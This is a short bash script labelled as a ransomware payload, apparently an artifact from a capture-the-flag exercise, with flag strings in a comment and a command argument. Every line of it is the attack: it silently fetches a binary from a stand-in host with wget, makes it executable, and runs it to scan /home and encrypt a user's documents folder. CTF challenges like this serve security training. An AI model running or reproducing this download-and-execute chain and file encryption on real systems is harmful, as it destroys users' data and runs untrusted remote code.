#!/bin/bash
# Malicious ransomware payload
echo "Downloading encryption tool..."
wget -q -O /tmp/encryptor http://malicious-site.com/encryptor.bin
chmod +x /tmp/encryptor

# The flag is hidden in this comment: FLAG{RANSOMWARE_STAGE_2_EXECUTION}
# But you need to find it in the process logs

/tmp/encryptor --scan /home --key="FLAG{4afb66408cb88d48}"
/tmp/encryptor --encrypt /home/user/documents